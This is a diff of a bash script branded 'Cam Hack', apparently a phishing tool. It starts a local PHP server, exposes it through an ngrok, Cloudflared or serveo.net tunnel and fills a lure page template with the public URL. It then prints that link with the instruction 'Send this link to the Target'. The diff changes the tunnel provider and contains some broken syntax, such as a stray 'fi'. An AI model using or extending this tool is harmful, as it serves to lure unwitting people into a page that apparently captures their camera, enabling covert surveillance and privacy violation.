@@ -19,7 +19,7 @@ echo -e "\e[95m
      ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
      ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝  \e[95;1m \e[0m\n"
   echo""    
-  echo -e $'\e[1;33m\e[0m\e[1;33m    ██████████\e[0m'"\e[96m██████████"'\e[1;33m\e[0m\e[1;31m██████████\e[0m' '\e[1;32m\e[0m\e[1;32m Cam Hack \e[0m''\e[1;37m\e[0m\e[1;37m [v 2.1] \e[0m'                                       
+  echo -e $'\e[1;33m\e[0m\e[1;33m    ██████████\e[0m'"\e[96m██████████"'\e[1;33m\e[0m\e[1;31m██████████\e[0m' '\e[1;32m\e[0m\e[1;32m Cam Hack \e[0m''\e[1;37m\e[0m\e[1;37m [v 2.0] \e[0m'                                       
   echo ""
       echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+-+ +-+-+-+-+-+-+-+ >>\e[0m'
       echo -e "\e[93m    |O|n|l|i|n|e| |H|a|c|k|i|n|g|"      
@@ -90,11 +90,22 @@ stop() {
 checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
 checkssh=$(ps aux | grep -o "ssh" | head -n1)
-php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
-ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
-kill -9 $php
-kill -9 $ngrok
-kill -9 $cloudflared
+if [[ $checkngrok == *'ngrok'* ]]; then
+pkill -f -2 ngrok > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
+fi
+
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+if [[ $checkssh == *'ssh'* ]]; then
+killall -2 ssh > /dev/null 2>&1
+fi
+exit 1
+
+}
+
+dependencies() {
 
 
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
@@ -149,48 +160,42 @@ server() {
 
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 
-
-echo ""
-echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
-echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !   PHP SERVER NOW STARTING   !  \e[0m'
-echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
-fuser -k 4444/tcp > /dev/null 2>&1
-php -S localhost:4444 > /dev/null 2>&1 &
-
-sleep 2
-
 echo ""
 echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------   \e[0m'
-echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m   !    STARTING CloudFlared    !  \e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m   !      STARTING SERVEO      !  \e[0m'
 echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------   \e[0m'
 
-killall -2 php > /dev/null 2>&1
-
-wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64
+wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
 chmod +x cloudflared
 
-			   echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Cloudflared...\e[0m  "
+echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Cloudflared...\e[0m  "
 			   echo -ne "  "
    		           if [[ `command -v termux-chroot` ]]; then
 			  sleep 2 && termux-chroot ./cloudflared tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
    			  else
      		           sleep 2 && ./cloudflared tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
    	                 fi
-			{ sleep 8; clear; }
-				send_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cld.log")
-			   
-sed 's+forwarding_link+'$send_link'+g' Friend-day.html > index2.html
-sed 's+forwarding_link+'$send_link'+g' template.php > index.php	
+			{ sleep 2; clear; }
+
+if [[ $subdomain_resp == true ]]; then
+
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
+
+sleep 8
+else
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
 
 sleep 2
-
-			   echo ""
-                           echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m Send this link to the Target "
-			   echo ""
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Cloudflared Link :\e[0m\e[1;77m %s\e[0m\n" $send_link                                  
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-
+fi
+echo ""
+echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !   PHP SERVER NOW STARTING   !  \e[0m'
+echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
+fuser -k 3333/tcp > /dev/null 2>&1
+php -S localhost:3333 > /dev/null 2>&1 &
+sleep 3
+send_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cld.log")
+printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
 
 }
 
@@ -247,49 +252,42 @@ echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   -------------------
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m   !  PHP Server Now Starting  !  \e[0m'
 echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
 echo ""
-php -S 127.0.0.1:4444 > /dev/null 2>&1 & 
+php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
 echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
-echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m   !        Start Ngrok        !  \e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m   !    Manually Start Ngrok   !  \e[0m'
 echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
 echo ""
-			   echo ""
-			   
-			   echo -e $" \e[91m[\e[0m Online HacKing\e[91m]\e[1;92m Wait for Start.....\e[0m  "
-			   echo -ne ""
-                           if [[ `command -v termux-chroot` ]]; then
-                           sleep 1 && termux-chroot ./ngrok http 127.0.0.1:4444 > /dev/null 2>&1 & 
-                          else
-                            sleep 1 && ./ngrok http 127.0.0.1:4444 > /dev/null 2>&1 &
-                         fi
-	                 { sleep 8; clear; }
-	                       link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
-			   
+echo ""
+echo -e "\e[91m[\e[92m*\e[91m]\e[1;93m Open New Session (tab) Type This Command :\e[0m\e[1;36m ./ngrok http 3333  "
+echo ""
+echo ""
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click ENTER to Continue \e[1;91m (enter) : \e[0m' option
+echo""
 
 
-sed 's+forwarding_link+'$link'+g' Friend-day.html > index2.html
-sed 's+forwarding_link+'$link'+g' template.php > index.php
+sleep 10
 
-sleep 1
-
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Link Chack Your New Tab Open Ngrok \e[0m\e[1;77m %s\e[0m\n" $link
 
-
+payload_ngrok
+checkfound
+}
 
 start1() {
 if [[ -e sendlink ]]; then
 rm -rf sendlink
-
 fi
 
 printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlared \e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option [DEFAULT IS 1]: \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 if [[ $option_server -eq 2 ]]; then
-
 
 command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 start
@@ -308,7 +306,7 @@ fi
 
 payload() {
 
-send_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cld.log")
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
 sed 's+forwarding_link+'$send_link'+g' Friend-day.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
@@ -319,6 +317,7 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 
+fi
 
 server
 payload
@@ -326,7 +325,7 @@ checkfound
 
 }
 
-
+banner
 dependencies
 start1
 
